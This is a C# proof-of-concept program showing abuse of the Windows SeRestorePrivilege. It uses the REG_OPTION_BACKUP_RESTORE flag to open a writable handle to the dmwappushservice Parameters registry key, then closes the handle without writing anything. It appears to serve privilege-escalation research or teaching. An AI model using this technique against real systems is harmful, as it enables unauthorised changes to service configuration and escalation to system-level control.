using System;
using System.Runtime.InteropServices;
using System.Text;

namespace SeRestorePrivilegePoC
{
    class SeRestorePrivilegePoC
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern uint FormatMessage(
            uint dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            uint nSize,
            IntPtr Arguments);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32", SetLastError = true)]
        static extern bool FreeLibrary(IntPtr hLibModule);

        [DllImport("advapi32.dll", SetLastError = false)]
        static extern int RegCreateKeyEx(
            UIntPtr hKey,
            string lpSubKey,
            IntPtr Reserved,
            IntPtr lpClass,
            uint dwOptions,
            uint samDesired,
            IntPtr lpSecurityAttributes,
            out IntPtr phkResult,
            IntPtr lpdwDisposition);

        const int STATUS_SUCCESS = 0;
        static readonly UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
        const uint REG_OPTION_BACKUP_RESTORE = 0x00000004;
        const uint KEY_SET_VALUE = 0x0002;

        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            uint FORMAT_MESSAGE_FROM_HMODULE = 0x00000800;
            uint FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000;
            StringBuilder message = new StringBuilder(255);
            IntPtr pNtdll = IntPtr.Zero;

            if (isNtStatus)
                pNtdll = LoadLibrary("ntdll.dll");

            uint status = FormatMessage(
                isNtStatus ? (FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_FROM_SYSTEM) : FORMAT_MESSAGE_FROM_SYSTEM,
                pNtdll,
                code,
                0,
                message,
                255,
                IntPtr.Zero);

            if (isNtStatus)
                FreeLibrary(pNtdll);

            if (status == 0)
            {
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            }
            else
            {
                return string.Format("[ERROR] Code 0x{0} : {1}",
                    code.ToString("X8"),
                    message.ToString().Trim());
            }
        }

        static IntPtr PrivilegedRegKeyOperation(string regKeyName)
        {
            Console.WriteLine("[*] If you have SeRestorePrivilege, you can get handle to sensitive files and registries with REG_OPTION_BACKUP_RESTORE flag.");
            Console.WriteLine("[>] Trying to get handle to HKLM:\\{0}.", regKeyName);

            int ntstatus = RegCreateKeyEx(
                HKEY_LOCAL_MACHINE,
                regKeyName,
                IntPtr.Zero,
                IntPtr.Zero,
                REG_OPTION_BACKUP_RESTORE,
                KEY_SET_VALUE,
                IntPtr.Zero,
                out IntPtr phkResult,
                IntPtr.Zero);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to get handle to HKLM:\\{0}.", regKeyName);
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
                return IntPtr.Zero;
            }

            return phkResult;
        }

        static void Main()
        {
            string regKeyName = "SYSTEM\\CurrentControlSet\\Services\\dmwappushservice\\Parameters";
            IntPtr phkResult = PrivilegedRegKeyOperation(regKeyName);

            if (phkResult != IntPtr.Zero)
            {
                Console.WriteLine("[+] Got handle to HKLM:\\{0} (hFile = 0x{1}).", regKeyName, phkResult.ToString("X"));
                Console.WriteLine("\n[*] To close the handle and exit this program, hit [ENTER] key.");
                Console.ReadLine();

                CloseHandle(phkResult);
            }
        }
    }
}
